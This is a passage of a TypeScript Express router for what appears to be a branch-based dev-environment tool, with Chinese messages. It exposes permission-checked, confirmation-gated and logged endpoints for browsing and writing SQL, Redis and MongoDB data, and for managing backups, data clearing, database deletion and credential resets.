      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, runtime: ctx.runtime, database, schema: ref.schema || (ctx.runtime === 'postgres' ? 'public' : database), table: ref.table, columns });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/preview', async (req, res) => {
    const ctx = await resolveSqlDataResourceForRequest(req, res);
    if (!ctx) return;
    let ref: SqlTableRef;
    try {
      ref = sqlTableRefFromRequest(req.query.table, req.query.schema);
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    const limitRaw = Number(req.query.limit);
    const limit = Number.isFinite(limitRaw) ? Math.min(Math.max(Math.floor(limitRaw), 1), 200) : 50;
    try {
      const database = sqlDataDatabase(ctx.runtime, ctx.service, ctx.branch);
      const ident = sqlTableIdent(ctx.runtime, ref);
      const result = await runSqlDataQuery(ctx.runtime, ctx.service, ctx.branch, `SELECT * FROM ${ident} LIMIT ${limit}`);
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, runtime: ctx.runtime, database, schema: ref.schema || (ctx.runtime === 'postgres' ? 'public' : database), table: ref.table, limit, ...result });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/data/query', async (req, res) => {
    const ctx = await resolveSqlDataResourceForRequest(req, res);
    if (!ctx) return;
    let sql = '';
    try {
      sql = normalizeReadOnlySql(typeof req.body?.sql === 'string' ? req.body.sql : '');
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    try {
      const database = sqlDataDatabase(ctx.runtime, ctx.service, ctx.branch);
      const result = await runSqlDataQuery(ctx.runtime, ctx.service, ctx.branch, sql);
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'success',
        note: `${ctx.resourceName} 执行只读 SQL：${sql.slice(0, 120)}`,
      });
      stateService.save();
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, runtime: ctx.runtime, database, sql, ...result });
    } catch (err) {
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'failed',
        note: `${ctx.resourceName} 只读 SQL 失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/data/query-write', async (req, res) => {
    const ctx = await resolveSqlDataResourceForRequest(req, res);
    if (!ctx) return;
    const resources = await getBranchResourceSnapshot(ctx.branch);
    const resource = resources.find((item) => item.id === ctx.resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${ctx.resourceId}" 不存在` });
      return;
    }
    if (!requireResourcePermission(req, res, 'data-write', ctx.branch, resource)) return;
    try {
      ensureResourceNameConfirmed(req.body?.confirmResourceName, resource, '执行写 SQL');
    } catch (err) {
      res.status(409).json({ error: (err as Error).message });
      return;
    }
    let sql = '';
    try {
      sql = normalizeDangerousWriteSql(typeof req.body?.sql === 'string' ? req.body.sql : '');
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    try {
      const database = sqlDataDatabase(ctx.runtime, ctx.service, ctx.branch);
      const result = await runSqlDataQuery(ctx.runtime, ctx.service, ctx.branch, sql);
      stateService.recordDestructiveOp({
        type: 'purge-database',
        projectId: ctx.projectId,
        summary: `对 ${ctx.resourceName} 执行写 SQL：${sql.slice(0, 160)}`,
        triggeredBy: resolveActorFromRequest(req),
      });
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'success',
        note: `${ctx.resourceName} 执行写 SQL：${sql.slice(0, 120)}`,
      });
      stateService.save();
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, runtime: ctx.runtime, database, sql, ...result });
    } catch (err) {
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'failed',
        note: `${ctx.resourceName} 写 SQL 失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/data/init-sql', async (req, res) => {
    const ctx = await resolveSqlDataResourceForRequest(req, res);
    if (!ctx) return;
    const resources = await getBranchResourceSnapshot(ctx.branch);
    const resource = resources.find((item) => item.id === ctx.resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${ctx.resourceId}" 不存在` });
      return;
    }
    if (!requireResourcePermission(req, res, 'data-write', ctx.branch, resource)) return;
    try {
      ensureResourceNameConfirmed(req.body?.confirmResourceName, resource, '执行初始化 SQL');
    } catch (err) {
      res.status(409).json({ error: (err as Error).message });
      return;
    }
    const sql = typeof req.body?.sql === 'string' ? req.body.sql : '';
    try {
      const database = sqlDataDatabase(ctx.runtime, ctx.service, ctx.branch);
      const result = await runSqlDataInitScript(ctx.runtime, ctx.service, ctx.branch, sql);
      stateService.recordDestructiveOp({
        type: 'purge-database',
        projectId: ctx.projectId,
        summary: `对 ${ctx.resourceName} 执行初始化 SQL：${database}`,
        triggeredBy: resolveActorFromRequest(req),
      });
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: result.exitCode === 0 ? 'success' : 'failed',
        note: `${ctx.resourceName} 执行初始化 SQL：${database}`,
      });
      stateService.save();
      res.status(result.exitCode === 0 ? 200 : 500).json({
        ok: result.exitCode === 0,
        branchId: ctx.branch.id,
        resourceId: ctx.resourceId,
        runtime: ctx.runtime,
        database,
        ...result,
      });
    } catch (err) {
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'failed',
        note: `${ctx.resourceName} 初始化 SQL 失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/redis/keys', async (req, res) => {
    const ctx = await resolveRedisDataResourceForRequest(req, res);
    if (!ctx) return;
    const cursor = typeof req.query.cursor === 'string' ? req.query.cursor : '0';
    const pattern = typeof req.query.pattern === 'string' && req.query.pattern.trim() ? req.query.pattern.trim().slice(0, 200) : '*';
    const countRaw = Number(req.query.count);
    const count = Number.isFinite(countRaw) ? Math.min(Math.max(Math.floor(countRaw), 10), 200) : 100;
    try {
      const output = await runRedisCli(ctx.service, ['SCAN', cursor, 'MATCH', pattern, 'COUNT', String(count)]);
      const lines = output ? output.split('\n') : ['0'];
      const nextCursor = lines[0] || '0';
      const names = lines.slice(1).filter(Boolean);
      const keys = await Promise.all(names.slice(0, count).map((key) => redisKeyMeta(ctx.service, key).catch(() => ({
        key,
        type: 'unknown',
        ttl: -2,
        memoryBytes: null,
      }))));
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, cursor: nextCursor, pattern, keys });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/redis/key', async (req, res) => {
    const ctx = await resolveRedisDataResourceForRequest(req, res);
    if (!ctx) return;
    let key = '';
    try {
      key = redisKeyFromRequest(req.query.key);
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    try {
      const meta = await redisKeyMeta(ctx.service, key);
      const preview = await redisValuePreview(ctx.service, key, meta.type);
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'success',
        note: `${ctx.resourceName} 查看 Redis key：${key.slice(0, 120)}`,
      });
      stateService.save();
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, ...meta, preview });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/redis/memory', async (req, res) => {
    const ctx = await resolveRedisDataResourceForRequest(req, res);
    if (!ctx) return;
    try {
      const info = await runRedisCli(ctx.service, ['INFO', 'memory']);
      const memory: Record<string, string> = {};
      for (const line of info.split('\n')) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const idx = trimmed.indexOf(':');
        if (idx > 0) memory[trimmed.slice(0, idx)] = trimmed.slice(idx + 1);
      }
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, memory });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/mongo/databases', async (req, res) => {
    const ctx = await resolveMongoDataResourceForRequest(req, res);
    if (!ctx) return;
    try {
      const configuredDatabase = mongoDatabaseForBranch(ctx.service, ctx.branch);
      const data = await runMongoJson(ctx.service, ctx.branch, 'JSON.stringify(db.adminCommand({ listDatabases: 1 }).databases.map(d => ({ name: d.name, sizeOnDisk: d.sizeOnDisk || 0 })))');
      const databases = Array.isArray(data) ? data : [];
      const currentDatabase = chooseMongoCurrentDatabase(configuredDatabase, databases);
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, configuredDatabase, currentDatabase, databases });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/mongo/collections', async (req, res) => {
    const ctx = await resolveMongoDataResourceForRequest(req, res);
    if (!ctx) return;
    try {
      const database = mongoDatabaseFromRequest(req.query.database, mongoDatabaseForBranch(ctx.service, ctx.branch));
      const script = `JSON.stringify(db.getCollectionInfos({}, { nameOnly: false }).map(c => ({ name: c.name, type: c.type || 'collection' })))`;
      const data = await runMongoJson(ctx.service, ctx.branch, script, database);
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, database, collections: Array.isArray(data) ? data : [] });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/data/mongo/documents', async (req, res) => {
    const ctx = await resolveMongoDataResourceForRequest(req, res);
    if (!ctx) return;
    let collection = '';
    try {
      collection = mongoCollectionFromRequest(req.query.collection);
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    const limitRaw = Number(req.query.limit);
    const limit = Number.isFinite(limitRaw) ? Math.min(Math.max(Math.floor(limitRaw), 1), 100) : 50;
    try {
      const database = mongoDatabaseFromRequest(req.query.database, mongoDatabaseForBranch(ctx.service, ctx.branch));
      const script = `JSON.stringify(db.getCollection(${mongoSafeJson(collection)}).find({}).limit(${limit}).toArray())`;
      const data = await runMongoJson(ctx.service, ctx.branch, script, database);
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, database, collection, limit, documents: Array.isArray(data) ? data : [] });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/data/mongo/command', async (req, res) => {
    const ctx = await resolveMongoDataResourceForRequest(req, res);
    if (!ctx) return;
    let database = '';
    let command: { collection: string; script: string };
    try {
      database = mongoDatabaseFromRequest(req.body?.database, mongoDatabaseForBranch(ctx.service, ctx.branch));
      command = normalizeMongoFindCommand(req.body?.command);
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    try {
      const data = await runMongoJson(ctx.service, ctx.branch, command.script, database);
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'success',
        note: `${ctx.resourceName} 执行 MongoDB find：${database}.${command.collection}`,
      });
      stateService.save();
      res.json({
        branchId: ctx.branch.id,
        resourceId: ctx.resourceId,
        database,
        collection: command.collection,
        kind: 'documents',
        documents: Array.isArray(data) ? data : [],
      });
    } catch (err) {
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'failed',
        note: `${ctx.resourceName} MongoDB command 失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/data/mongo/query', async (req, res) => {
    const ctx = await resolveMongoDataResourceForRequest(req, res);
    if (!ctx) return;
    let collection = '';
    let filter: Record<string, unknown>;
    let projection: Record<string, unknown>;
    let sort: Record<string, unknown>;
    try {
      collection = mongoCollectionFromRequest(req.body?.collection);
      mongoDatabaseFromRequest(req.body?.database, mongoDatabaseForBranch(ctx.service, ctx.branch));
      filter = mongoJsonObject(req.body?.filter, 'filter');
      projection = mongoJsonObject(req.body?.projection, 'projection');
      sort = mongoJsonObject(req.body?.sort, 'sort');
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }
    const limitRaw = Number(req.body?.limit);
    const limit = Number.isFinite(limitRaw) ? Math.min(Math.max(Math.floor(limitRaw), 1), 100) : 50;
    try {
      const database = mongoDatabaseFromRequest(req.body?.database, mongoDatabaseForBranch(ctx.service, ctx.branch));
      const script = [
        `const cursor = db.getCollection(${mongoSafeJson(collection)}).find(${mongoSafeJson(filter)}, ${mongoSafeJson(projection)}).sort(${mongoSafeJson(sort)}).limit(${limit});`,
        'JSON.stringify(cursor.toArray())',
      ].join(' ');
      const data = await runMongoJson(ctx.service, ctx.branch, script, database);
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'success',
        note: `${ctx.resourceName} 查询 MongoDB collection：${collection}`,
      });
      stateService.save();
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, database, collection, filter, projection, sort, limit, documents: Array.isArray(data) ? data : [] });
    } catch (err) {
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'failed',
        note: `${ctx.resourceName} MongoDB 查询失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/data/mongo/write', async (req, res) => {
    const ctx = await resolveMongoDataResourceForRequest(req, res);
    if (!ctx) return;
    const resources = await getBranchResourceSnapshot(ctx.branch);
    const resource = resources.find((item) => item.id === ctx.resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${ctx.resourceId}" 不存在` });
      return;
    }
    if (!requireResourcePermission(req, res, 'data-write', ctx.branch, resource)) return;
    try {
      ensureResourceNameConfirmed(req.body?.confirmResourceName, resource, '执行 MongoDB 写入');
    } catch (err) {
      res.status(409).json({ error: (err as Error).message });
      return;
    }

    const action = String(req.body?.action || '').trim();
    let database = '';
    let collection = '';
    let script = '';
    try {
      database = mongoDatabaseFromRequest(req.body?.database, mongoDatabaseForBranch(ctx.service, ctx.branch));
      collection = mongoCollectionFromRequest(req.body?.collection);
      if (action === 'insertOne') {
        const document = mongoJsonObject(req.body?.document, 'document');
        script = `JSON.stringify(db.getCollection(${mongoSafeJson(collection)}).insertOne(${mongoSafeJson(document)}))`;
      } else if (action === 'updateMany') {
        const filter = mongoJsonObject(req.body?.filter, 'filter');
        const update = mongoJsonObject(req.body?.update, 'update');
        if (Object.keys(update).length === 0) throw new Error('update 不能为空');
        script = `JSON.stringify(db.getCollection(${mongoSafeJson(collection)}).updateMany(${mongoSafeJson(filter)}, ${mongoSafeJson(update)}))`;
      } else if (action === 'deleteMany') {
        const filter = mongoJsonObject(req.body?.filter, 'filter');
        if (Object.keys(filter).length === 0) throw new Error('deleteMany 必须提供非空 filter');
        script = `JSON.stringify(db.getCollection(${mongoSafeJson(collection)}).deleteMany(${mongoSafeJson(filter)}))`;
      } else if (action === 'createCollection') {
        script = `JSON.stringify(db.createCollection(${mongoSafeJson(collection)}))`;
      } else if (action === 'dropCollection') {
        script = `JSON.stringify({ dropped: db.getCollection(${mongoSafeJson(collection)}).drop() })`;
      } else {
        throw new Error('action 只允许 insertOne / updateMany / deleteMany / createCollection / dropCollection');
      }
    } catch (err) {
      res.status(400).json({ error: (err as Error).message });
      return;
    }

    try {
      const result = await runMongoJson(ctx.service, ctx.branch, script, database);
      stateService.recordDestructiveOp({
        type: 'purge-database',
        projectId: ctx.projectId,
        summary: `对 ${ctx.resourceName} 执行 MongoDB ${action}：${database}.${collection}`,
        triggeredBy: resolveActorFromRequest(req),
      });
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'success',
        note: `${ctx.resourceName} 执行 MongoDB ${action}：${database}.${collection}`,
      });
      stateService.save();
      res.json({ branchId: ctx.branch.id, resourceId: ctx.resourceId, database, collection, action, result });
    } catch (err) {
      stateService.appendActivityLog(ctx.projectId, {
        type: 'resource-data-query',
        branchId: ctx.branch.id,
        branchName: ctx.branch.branch,
        actor: resolveActorFromRequest(req),
        resourceId: ctx.resourceId,
        resourceName: ctx.resourceName,
        result: 'failed',
        note: `${ctx.resourceName} MongoDB ${action} 失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/resources/:resourceId/backups', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    const runtime = resourceRuntimeKey(resource.runtime);
    if (resource.source !== 'infra' || !['mysql', 'postgres', 'mongodb', 'redis'].includes(runtime)) {
      res.status(400).json({ error: '只有数据库/缓存资源支持备份列表' });
      return;
    }
    const rawInfra = resource.raw as InfraService;
    try {
      const database = resourceDatabaseForRuntime(runtime as ResourceDatabaseRuntime, rawInfra, branch);
      const backups = await listResourceBackupEntries(rawInfra, branch, runtime as ResourceDatabaseRuntime, database);
      res.json({ branchId: branch.id, resourceId, runtime, database, backups, directory: resourceBackupDir(), supported: true });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/backups', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (!requireResourcePermission(req, res, 'backup-create', branch, resource)) return;
    const runtime = resourceRuntimeKey(resource.runtime);
    if (resource.source !== 'infra' || !['mysql', 'postgres', 'mongodb', 'redis'].includes(runtime)) {
      res.status(400).json({ error: '只有数据库/缓存资源支持手动备份' });
      return;
    }
    const actor = resolveActorFromRequest(req);
    const rawInfra = resource.raw as InfraService;
    try {
      const backup = await createResourceBackupFile({
        runtime: runtime as ResourceDatabaseRuntime,
        service: rawInfra,
        branch,
        resourceId,
        resourceName: resource.displayName,
        projectId,
        actor,
        reason: 'manual',
      });
      stateService.save();
      res.status(201).json({ branchId: branch.id, resourceId, backup });
    } catch (err) {
      stateService.appendActivityLog(projectId, {
        type: 'resource-backup',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: 'failed',
        note: `${resource.displayName} 手动备份失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/restore-backup', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (!requireResourcePermission(req, res, 'backup-restore', branch, resource)) return;
    const runtime = resourceRuntimeKey(resource.runtime);
    if (resource.source !== 'infra' || !['mysql', 'postgres', 'mongodb', 'redis'].includes(runtime)) {
      res.status(400).json({ error: '只有数据库/缓存资源支持备份恢复' });
      return;
    }
    const confirmResourceName = String(req.body?.confirmResourceName || '').trim();
    const acceptedNames = new Set([resource.displayName, resource.serviceName, (resource.raw as InfraService).id].filter(Boolean));
    if (!acceptedNames.has(confirmResourceName)) {
      res.status(409).json({ error: `恢复会覆盖当前库，请输入资源名确认：${resource.displayName}` });
      return;
    }
    const actor = resolveActorFromRequest(req);
    const rawInfra = resource.raw as InfraService;
    try {
      const restored = await restoreResourceBackupFile({
        runtime: runtime as ResourceDatabaseRuntime,
        service: rawInfra,
        branch,
        resourceId,
        resourceName: resource.displayName,
        projectId,
        actor,
        backupName: req.body?.backupName,
      });
      stateService.save();
      res.json({ branchId: branch.id, resourceId, restored });
    } catch (err) {
      stateService.appendActivityLog(projectId, {
        type: 'resource-restore',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: 'failed',
        note: `${resource.displayName} 恢复失败：${(err as Error).message}`,
      });
      stateService.save();
      const message = (err as Error).message;
      res.status(message.includes('备份文件不属于当前资源或分支') ? 409 : 500).json({ error: message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/clear-data', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (resource.source !== 'infra' || !['database', 'cache'].includes(resource.kind)) {
      res.status(400).json({ error: '只有数据库/缓存资源支持清空数据' });
      return;
    }
    if (!requireResourcePermission(req, res, 'data-clear', branch, resource)) return;
    const runtime = resourceRuntimeKey(resource.runtime);
    if (!['mysql', 'postgres', 'mongodb', 'redis'].includes(runtime)) {
      res.status(400).json({ error: `${resource.runtime} 暂不支持清空数据` });
      return;
    }
    try {
      ensureResourceNameConfirmed(req.body?.confirmResourceName, resource, '清空数据');
    } catch (err) {
      res.status(409).json({ error: (err as Error).message });
      return;
    }
    const actor = resolveActorFromRequest(req);
    try {
      const result = await clearResourceData({
        runtime: runtime as ResourceDatabaseRuntime,
        service: resource.raw as InfraService,
        branch,
        resourceId,
        resourceName: resource.displayName,
        projectId,
        actor,
      });
      stateService.save();
      res.json({ branchId: branch.id, resourceId, cleared: result });
    } catch (err) {
      stateService.appendActivityLog(projectId, {
        type: 'resource-restore',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: 'failed',
        note: `${resource.displayName} 清空数据失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/branches/:id/resources/:resourceId', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (resource.source !== 'infra' || resource.kind !== 'database') {
      res.status(400).json({ error: '当前只支持删除分支独立数据库资源' });
      return;
    }
    if (!requireResourcePermission(req, res, 'resource-delete', branch, resource)) return;
    const runtime = resourceRuntimeKey(resource.runtime);
    if (!['mysql', 'postgres', 'mongodb'].includes(runtime)) {
      res.status(400).json({ error: `${resource.runtime} 暂不支持删除分支数据库` });
      return;
    }
    try {
      ensureResourceNameConfirmed(req.body?.confirmResourceName || req.query.confirmResourceName, resource, '删除数据库');
    } catch (err) {
      res.status(409).json({ error: (err as Error).message });
      return;
    }
    const actor = resolveActorFromRequest(req);
    try {
      const result = await deleteBranchDatabaseResource({
        runtime: runtime as ResourceDatabaseRuntime,
        service: resource.raw as InfraService,
        branch,
        resourceId,
        resourceName: resource.displayName,
        projectId,
        actor,
      });
      stateService.save();
      const nextResources = await getBranchResourceSnapshot(branch);
      res.json({ branchId: branch.id, resourceId, deleted: result, resources: nextResources });
    } catch (err) {
      stateService.appendActivityLog(projectId, {
        type: 'resource-deleted',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: 'failed',
        note: `${resource.displayName} 删除数据库失败：${(err as Error).message}`,
      });
      stateService.save();
      const message = (err as Error).message;
      res.status(message.includes('拒绝删除共享数据库') ? 409 : 500).json({ error: message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/credentials/reset', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (resource.source !== 'infra' || resource.kind !== 'database') {
      res.status(400).json({ error: '只有数据库资源支持重置连接凭据' });
      return;
    }
    if (!requireResourcePermission(req, res, 'credentials-reset', branch, resource)) return;
    const runtime = resourceRuntimeKey(resource.runtime);
    if (!['mysql', 'postgres', 'mongodb'].includes(runtime)) {
      res.status(400).json({ error: `${resource.runtime} 暂不支持凭据重置` });
      return;
    }
    const rawInfra = resource.raw as InfraService;
    const confirmResourceName = String(req.body?.confirmResourceName || '').trim();
    const acceptedNames = new Set([resource.displayName, resource.serviceName, rawInfra.id].filter(Boolean));
    if (!acceptedNames.has(confirmResourceName)) {
      res.status(409).json({ error: `重置会让旧连接失效，请输入资源名确认：${resource.serviceName}` });
      return;
    }
    const actor = resolveActorFromRequest(req);
    try {
      const result = await resetResourceBranchCredentials(runtime, rawInfra, branch);
      injectBranchEnv(branch, result.injectedEnv);
      stateService.appendActivityLog(projectId, {
        type: 'resource-credentials-reset',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: 'success',
        note: `${resource.displayName} 已重置分支 ${resource.runtime} 账号 ${result.branchUser || '(none)'}，旧连接需要重新部署后生效`,
      });
      stateService.save();
      const nextResources = await getBranchResourceSnapshot(branch);
      res.json({
        branchId: branch.id,
        resourceId,
        injectedEnv: result.maskedInjectedEnv,
        resource: nextResources.find((item) => item.id === resourceId) || null,
        needsRedeploy: true,
      });
    } catch (err) {
      stateService.appendActivityLog(projectId, {
        type: 'resource-credentials-reset',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: 'failed',
        note: `${resource.displayName} 凭据重置失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/resources/:resourceId/inject-connection', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (resource.source !== 'infra' || resource.kind !== 'database') {
      res.status(400).json({ error: '只有数据库资源支持连接变量注入' });
      return;
    }
    if (!requireResourcePermission(req, res, 'connection-inject', branch, resource)) return;
